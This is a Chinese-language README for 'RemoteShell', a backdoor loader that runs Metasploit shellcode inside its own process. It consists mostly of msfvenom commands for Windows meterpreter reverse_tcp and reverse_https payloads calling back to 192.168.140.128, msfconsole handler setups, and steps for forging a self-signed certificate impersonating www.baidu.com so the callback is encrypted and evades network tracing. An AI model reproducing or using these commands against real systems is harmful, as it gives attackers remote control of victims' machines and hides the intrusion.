# RemoteShell 远程Shell加载工具

![image](https://user-images.githubusercontent.com/52789403/192442397-bc23a92a-41f9-4d54-990f-3697ba9fc701.png)

这是一款远程ShellCode反弹执行后门，该工具可动态加载MSF生成的shellcode到自身进程内。

 - 生成无加密ShellCode

非加密ShellCode代码主要用于测试可用性,由于数据包非加密,所以无法应对网络溯源.
```C
# 生成代码
[root@localhost ~]# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp \
-b '\x00\x0b' lhost=192.168.140.128 lport=9999 -f c

[root@localhost ~]# msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp \
-b '\x00\x0b' lhost=192.168.140.128 lport=9999 -f c

# 建立侦听器
[root@localhost ~]# msfconsole
msf6 exploit(handler) > use exploit/multi/handler
msf6 exploit(handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(handler) > set lhost 192.168.140.128
msf6 exploit(handler) > set lport 9999
msf6 exploit(handler) > set EXITFUNC thread
msf6 exploit(handler) > exploit -j -z
```

 - 生成加密ShellCode

通过伪造证书克隆百度PEM文件,并应用于反向ShellCode代码中,此时代码在传输层已经被SSL加密.
```C
# 生成代码
[root@localhost ~]# openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
> -subj "/C=UK/ST=London/L=London/O=Development/CN=www.baidu.com" \
> -keyout www.baidu.com.key -out www.baidu.com.crt

[root@localhost ~]# cat www.baidu.com.key www.baidu.com.crt > www.baidu.com.pem
[root@localhost ~]# msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_https \
> lhost=192.168.140.128 lport=8443 PayloadUUIDTracking=true PayloadUUIDName=MyShell \
> HandlerSSLCert=/root/www.baidu.com.pem StagerVerifySSLCert=true \
> -f c -o /root/shell.c

# 建立侦听器
[root@localhost ~]# msfconsole
msf6 exploit(handler) > use exploit/multi/handler
msf6 exploit(handler) > set payload windows/meterpreter/reverse_https
msf6 exploit(handler) > set LHOST 192.168.140.128
msf6 exploit(handler) > set LPORT 8443
msf6 exploit(handler) > set HandlerSSLCert /root/www.baidu.com.pem
msf6 exploit(handler) > set StagerVerifySSLCert true
msf6 exploit(handler) > exploit -j -z
```

